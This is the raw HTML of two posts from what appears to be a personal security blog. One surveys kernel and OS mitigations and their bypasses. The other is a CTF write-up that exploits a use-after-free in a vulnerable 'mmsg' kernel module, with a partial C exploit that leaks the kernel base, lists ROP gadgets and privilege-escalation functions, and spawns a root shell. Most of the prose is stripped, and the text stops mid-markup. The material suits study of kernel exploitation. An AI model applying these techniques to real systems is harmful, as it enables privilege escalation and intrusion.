class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *tcb;<span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">   thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">void</span> *self;<span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> unused_vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class="line"><span class="comment">     Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> feature_1;</span><br><span class="line">  <span class="type">int</span> __glibc_unused1;</span><br><span class="line">  <span class="comment">/* Reservation of some values for the TM ABI.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">/* GCC split stack support.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_ss;</span><br><span class="line">  <span class="comment">/* The marker for the current shadow stack.  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ssp_base;</span><br><span class="line">  <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class="line">  __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((<span class="built_in">aligned</span> (<span class="number">32</span>)));</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>per-cpu per-taskstack canary, cpu&#x2F;, per cpuper-cpu&#x2F;canary(per-cpu canary),per-taskcanary.</p><h3 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h3><h4 id="kaslr"><a href="#kaslr" class="headerlink" title="kaslr"></a>kaslr</h4><p>kernel address space layout randomize</p><p> KASLR </p><h4 id="smap"><a href="#smap" class="headerlink" title="smap"></a>smap</h4><p>Supervisor Mode Access Prevention</p><p>(pop rsp) ROP</p><p> Linux <strong></strong>x86  SMAPCR4  21  SMEP </p><p>x86CPUCPUbypass: cr4</p><h4 id="smep"><a href="#smep" class="headerlink" title="smep"></a>smep</h4><p>Supervisor Mode Execution Prevention</p><p><strong></strong></p><p> Linux <strong></strong>(ARM PXN)x86 <code>CR4</code>  20  SMEP </p><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep smap /proc/cpuinfo  <span class="comment"># </span></span><br></pre></td></tr></table></figure><p>bypass: cr4</p><h4 id="kpti"><a href="#kpti" class="headerlink" title="kpti"></a>kpti</h4><p>Kernel Page Table Isolation</p><p> x86_64  PTI <strong></strong> SMEP  KPTI  SMEP SMAP  KPTI  SMAP  Shellcode</p><p>bypass</p><ul><li>signal handler</li><li>swapgs_restore_regs_and_return_to_usermode  cr3 gadget</li></ul><h4 id="fgkaslr"><a href="#fgkaslr" class="headerlink" title="fgkaslr"></a>fgkaslr</h4><p>FGKASLR  KASLR FGKASLR  <strong>x86_64</strong> </p><p>FGKASLR  gcc <code>-ffunction-sections</code> section   C </p><p> FGKASLR<code>CONFIG_FG_KASLR=y</code></p><h4 id="Kernel-Stack-Canary"><a href="#Kernel-Stack-Canary" class="headerlink" title="Kernel Stack Canary"></a>Kernel Stack Canary</h4><p> CONFIG_CC_STACKPROTECTOR </p><p> x86  task  Canary</p><h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><blockquote><p> Linux Kernel</p></blockquote><h3 id="pxn"><a href="#pxn" class="headerlink" title="pxn"></a>pxn</h3><p>Privileged Execute-Never</p><p> smep </p><p>armv8PXNAndroid 5 arm64AndroidPXN</p><h3 id="pan"><a href="#pan" class="headerlink" title="pan"></a>pan</h3><p>smap </p><h3 id="cfi"><a href="#cfi" class="headerlink" title="cfi"></a>cfi</h3><p>Control-Flow Integrity </p><p><strong></strong>CFI</p><p> CFI x86</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_CFI_CLANG=y</span><br></pre></td></tr></table></figure><h3 id="SELinux"><a href="#SELinux" class="headerlink" title="SELinux"></a>SELinux</h3><p>Android 8.08.0vendor.img   SELinux</p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><p> Linux ASLR (Address Space Layout Randomization) DLL ASLR  Windows 10 </p><h3 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h3><p>Data Execute Protector</p><p><code>VirtualAlloc()</code>&#96;</p><h3 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h3><p> Linux  Canary  BP  <strong>Security Cookie</strong> .data </p><h3 id="NET"><a href="#NET" class="headerlink" title=".NET"></a>.NET</h3><p>DLL </p><h3 id="Isolation"><a href="#Isolation" class="headerlink" title="Isolation"></a>Isolation</h3><p></p><h3 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h3><p>Structured Exception Handling SEH <code>Windows</code> Windows </p><h3 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h3><p></p><h3 id="SMEP-SMAP"><a href="#SMEP-SMAP" class="headerlink" title="SMEP SMAP"></a>SMEP SMAP</h3><p>windows10  SMEPSMAP</p><h3 id="KVAS"><a href="#KVAS" class="headerlink" title="KVAS"></a>KVAS</h3><p>Kernel Virtual Address ShadowKVASMeltdownWindowsKPTI</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/readme/">CTF-wili</a></li><li><a href="https://source.android.google.cn/docs/security/test/cfi?hl=zh-cn">android CFI</a></li><li><a href="https://clang.llvm.org/docs/ControlFlowIntegrity.html">Control Flow Integrity  Clang</a></li><li><a href="https://www.cnblogs.com/pwnfeifei/p/17162374.html">windows pwn</a></li><li><a href="https://a1ex.online/2020/10/15/Windows-Pwn%E5%AD%A6%E4%B9%A0/">Windows_Pwn</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag>  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>peekgeek-mmsg</title>
      <link href="/2023/07/28/peekgeek-mmsg/"/>
      <url>/2023/07/28/peekgeek-mmsg/</url>
      
        <content type="html"><![CDATA[<blockquote><p>.</p></blockquote><span id="more"></span><h2 id="step1-init"><a href="#step1-init" class="headerlink" title="step1: init"></a>step1: init</h2><p>smep, smap, kaslrpti</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">        -m 256M \</span><br><span class="line">        -cpu host,+smep,+smap \</span><br><span class="line">        -smp cores=1 \</span><br><span class="line">        -kernel bzImage \</span><br><span class="line">        -hda rootfs.img \</span><br><span class="line">        -nographic \</span><br><span class="line">        -monitor none \</span><br><span class="line">        -snapshot \</span><br><span class="line">        -enable-kvm \</span><br><span class="line">        -append <span class="string">&quot;console=ttyS0 root=/dev/sda rw kaslr rdinit=/sbin/init  quiet oops=panic panic=1&quot;</span> \</span><br><span class="line">        -no-reboot</span><br></pre></td></tr></table></figure><p>ext4 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> rootfs</span><br><span class="line"></span><br><span class="line">sudo mount rootfs.img ./rootfs</span><br></pre></td></tr></table></figure><p>init etc&#x2F;init.d </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">chown</span> -R root:root /</span><br><span class="line"><span class="built_in">chmod</span> 700 /root</span><br><span class="line"><span class="built_in">chown</span> -R ctf:ctf /home/ctf</span><br><span class="line"><span class="built_in">chown</span> root:root /root/flag</span><br><span class="line"><span class="built_in">chmod</span> 600 /root/flag</span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"><span class="built_in">mkdir</span> /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line"></span><br><span class="line"><span class="comment"># echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span></span><br><span class="line"><span class="comment"># echo 1 &gt; /proc/sys/kernel/kptr_restrict</span></span><br><span class="line"></span><br><span class="line">insmod /root/mmsg.ko</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/mmsg</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\nBoot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /home/ctf</span><br><span class="line"><span class="comment"># setsid cttyhack su ctf -c /bin/sh</span></span><br><span class="line">setsid cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="comment"># setsid cttyhack setuidgid 0 /bin/sh</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p>koetc&#x2F;init.d&#x2F;rcSumount<strong>umount</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount ./rootfs</span><br></pre></td></tr></table></figure><p> <code>5.10.186</code></p><h2 id="step2-ko"><a href="#step2-ko" class="headerlink" title="step2: ko"></a>step2: ko</h2><p>koc<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/uaf/">kernel UAF - CTF Wiki</a>0x20</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_head</span> *<span class="title">mmsg_head</span>;</span> </span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">mmsg_device</span>;</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_close</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span> &#123;</span><br><span class="line">  kfree(mmsg_head);</span><br><span class="line">  <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">mmsg_module_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">    mmsg_device.minor = MISC_DYNAMIC_MINOR;</span><br><span class="line">    mmsg_device.name = DEVICE_NAME;</span><br><span class="line">    mmsg_device.fops = &amp;module_fops;</span><br><span class="line">    misc_register(&amp;mmsg_device);</span><br><span class="line">    mmsg_head = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_head), GFP_KERNEL);</span><br><span class="line">    <span class="built_in">strncpy</span>(mmsg_head-&gt;description, DEVICE_NAME <span class="string">&quot;-mmsg_head&quot;</span>, <span class="number">15</span>);</span><br><span class="line">    INIT_LIST_HEAD(&amp;mmsg_head-&gt;<span class="built_in">list</span>);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Hello, World!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">mmsg_module_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    misc_deregister(&amp;mmsg_device);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Goodbye, World!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="step3-exploit"><a href="#step3-exploit" class="headerlink" title="step3: exploit"></a>step3: exploit</h2><p>ROP</p><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p> <a href="https://n.ova.moe/blog/2023/03/18/_%E5%86%85%E6%A0%B8%E9%A2%98%E7%9B%AE%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95">PWN PWN </a></p><ul><li>exp</li><li>kaslroffset</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  gcc exp.c -static -o exp</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd1, fd2;</span><br><span class="line"><span class="type">int</span> seq_fd;</span><br><span class="line"><span class="type">size_t</span> buf[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *dev_name = <span class="string">&quot;/dev/mmsg&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel base =&gt;  cat /proc/kallsyms | grep startup_64</span></span><br><span class="line"><span class="type">size_t</span> kernel_base;</span><br><span class="line"><span class="type">size_t</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">// nokalr kernel base</span></span><br><span class="line"><span class="type">size_t</span> nokaslr = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * cat /sys/module/mmsg/sections/.text</span></span><br><span class="line"><span class="comment"> * 0xffffffffc03f5000</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// close kaslr</span></span><br><span class="line"><span class="comment">// grep prepare_kernel_cred  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff9248d790</span>;</span><br><span class="line"><span class="comment">// grep commit_creds  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff9248d350</span>;</span><br><span class="line"><span class="comment">// grep swapgs_restore_regs_and_return_to_usermode  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff93000e30</span>;</span><br><span class="line"><span class="comment">//  grep native_write_cr4 /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> native_write_cr4 = <span class="number">0xffffffffa8832250</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ropper</span></span><br><span class="line"><span class="comment">// pop rdi; ret</span></span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff812274dd</span>;</span><br><span class="line"><span class="comment">// 0xffffffff82d63c0d: mov edi, eax; call rbx;</span></span><br><span class="line"><span class="comment">//  64  32  32 </span></span><br><span class="line"><span class="type">size_t</span> mov_edi_eax_call_rbx = <span class="number">0xffffffff82d63c0d</span>;</span><br><span class="line"><span class="comment">// 0xffffffff82e6f708: pop rbx; ret; </span></span><br><span class="line"><span class="type">size_t</span> pop_rbx_ret = <span class="number">0xffffffff82e6f708</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> token;</span><br><span class="line">  <span class="type">int</span> top;</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line">  <span class="type">char</span> *data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">new</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">recv_mmsg</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_mmsg</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">put_mmsg</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *addr)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_arg));</span><br><span class="line">  arg.data = addr;</span><br><span class="line">  ioctl(fd, <span class="number">0x5555555</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_mmsg</span><span class="params">(<span class="type">int</span> fd)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_arg));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  arg.data = (<span class="type">char</span> *)buf;</span><br><span class="line">  ioctl(fd, <span class="number">0x6666666</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line"> <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> user_cs, user_ss, user_rflags, user_rsp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">asm</span>(</span><br><span class="line">   <span class="string">&quot;movq %%cs, %0;&quot;</span></span><br><span class="line">   <span class="string">&quot;movq %%ss, %1;&quot;</span></span><br><span class="line">   <span class="string">&quot;movq %%rsp, %3;&quot;</span></span><br><span class="line">   <span class="string">&quot;pushfq;&quot;</span></span><br><span class="line">    <span class="string">&quot;pop %2;&quot;</span></span><br><span class="line">   : <span class="string">&quot;=r&quot;</span>(user_cs),<span class="string">&quot;=r&quot;</span>(user_ss),<span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_rsp)</span><br><span class="line">   : </span><br><span class="line">      : <span class="string">&quot;memory&quot;</span></span><br><span class="line">   );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span>( getuid() ) &#123;</span><br><span class="line">  err_exit(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seq_open</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> seq;</span><br><span class="line"> <span class="keyword">if</span> ( (seq=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) == <span class="number">-1</span>) &#123;</span><br><span class="line">  err_exit(<span class="string">&quot;[x] seq open fail&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> seq;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">uaf</span><span class="params">()</span> &#123;</span><br><span class="line">    fd1 = open(dev_name, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd1 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      err_exit(<span class="string">&quot;[x] open device 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd2 = open(dev_name, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd2 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      err_exit(<span class="string">&quot;[x] open device 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_base</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// read  seq_operations-&gt;start </span></span><br><span class="line">    seq_fd = seq_open();</span><br><span class="line">    get_mmsg(fd2);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;buf[%d] =&gt; 0x%llx\n&quot;</span>, j, buf[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    kernel_base = buf[<span class="number">0</span>] - <span class="number">0x20fac0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel base =&gt; 0x%llx&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    kernel_offset = kernel_base - nokaslr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status(); </span><br><span class="line">    uaf();</span><br><span class="line">    leak_base();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>rop</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 